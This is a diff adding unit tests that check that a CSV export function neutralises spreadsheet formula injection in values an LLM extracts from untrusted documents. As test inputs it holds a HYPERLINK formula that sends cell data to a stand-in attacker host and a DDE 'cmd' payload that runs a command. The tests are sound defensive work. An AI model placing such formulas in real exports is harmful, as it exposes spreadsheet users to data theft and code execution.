@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import { test } from "node:test";
-import { serialize, toCsv, toJson, toXml } from "../src/services/formats.ts";
+import { csvCell, serialize, toCsv, toJson, toXml } from "../src/services/formats.ts";
 import type { DocumentRecord } from "../src/types.ts";
 
 function sample(): DocumentRecord {
@@ -72,4 +72,28 @@ test("serialize dispatches by format", () => {
   assert.equal(serialize(rec, "json"), toJson(rec));
   assert.equal(serialize(rec, "xml"), toXml(rec));
   assert.equal(serialize(rec, "csv"), toCsv(rec));
+});
+
+test("csvCell neutralises spreadsheet formula injection but leaves numbers alone", () => {
+  // Field values come from an LLM reading an attacker-supplied document, so a vendor name
+  // can be anything. Excel/Sheets execute a cell that starts with = + - @ tab or CR.
+  assert.equal(csvCell("=1+1"), "'=1+1");
+  assert.equal(csvCell("@SUM(A1)"), "'@SUM(A1)");
+  assert.equal(csvCell("+61 3 9000 1234"), "'+61 3 9000 1234");
+  assert.equal(
+    csvCell('=HYPERLINK("http://evil.example/?x="&A1,"click")'),
+    `"'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"`,
+  );
+  // Numbers must stay numbers so the export is still arithmetic-friendly.
+  assert.equal(csvCell("-105.5"), "-105.5");
+  assert.equal(csvCell("105600"), "105600");
+  assert.equal(csvCell("ACME ROBOTICS"), "ACME ROBOTICS");
+});
+
+test("toCsv escapes a malicious extracted value", () => {
+  const rec = sample();
+  rec.fields = [{ key: "vendor_name", label: "Vendor", value: "=cmd|'/c calc'!A1", confidence: 0.9 }];
+  const row = toCsv(rec).split("\n")[1]!;
+  // No comma/quote/newline in the value, so no RFC 4180 quoting — just the formula guard.
+  assert.ok(row.endsWith("Vendor,'=cmd|'/c calc'!A1,0.90"), row);
 });
